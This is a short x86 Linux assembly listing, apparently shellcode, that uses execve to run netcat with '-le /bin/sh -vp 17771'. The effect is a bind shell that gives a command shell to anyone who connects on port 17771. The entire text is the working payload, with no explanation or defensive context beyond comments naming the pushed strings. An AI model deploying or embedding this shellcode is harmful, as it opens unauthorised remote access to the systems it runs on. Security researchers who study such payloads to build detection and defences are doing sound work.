global _start
section .text
 _start:
    xor eax, eax
    xor edx, edx
    push eax
    push 0x31373737     ;-vp17771
    push 0x3170762d
    mov esi, esp

    push eax
    push 0x68732f2f     ;-le//bin//sh
    push 0x6e69622f
    push 0x2f656c2d
    mov edi, esp

    push eax
    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
